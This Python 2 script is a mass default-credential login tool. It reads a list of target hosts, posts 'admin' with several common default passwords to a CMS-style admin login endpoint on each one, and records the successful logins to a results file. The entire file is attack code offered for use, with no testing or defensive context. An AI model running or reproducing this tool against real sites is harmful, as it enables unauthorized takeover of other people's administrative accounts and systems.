# coding: utf-8
import requests
import re
import json


def checklogin():
    urls = getUrls()
    # print urls
    i = 0
    for url in urls:
        url = checkUrl(url)
        i += 1
        url = url.replace('\n','')
        # print url
        # break
        passwords = ['123456','admin','admin123','admin8888']
        data = {
            "login_type":"system",
            "referer":"",
            "username":"admin",
            "password":"asdf",
            "token":"51d3e64a",
            "smscode":""
        }
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "X-Requested-With":"XMLHttpRequest",
            "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
        }
        for password in passwords:
            data['password']=password
            try:
                r1 = requests.post(url,data=data,headers=headers,timeout=5)
                # print r1.content
                res = json.loads(r1.content)['message']['message']
                if 'admin' in res:
                    result =  url + " | admin/"+password
                    print str(i) + " : " + result
                    with open("./results.txt",'a+') as f:
                        f.write(result+'\n')
                    break
                else:
                    pass
            except Exception,e:
                pass#print e
    
def getUrls():
    fp = open("./urls.txt","rb")
    urls = fp.readlines()
    fp.close()
    return urls

def checkUrl(url):
    url = url.lstrip()
    # print url
    if url[0:4]!='http':
        url = "http://" + url
    return url + "/web/index.php?c=user&a=login"


checklogin()
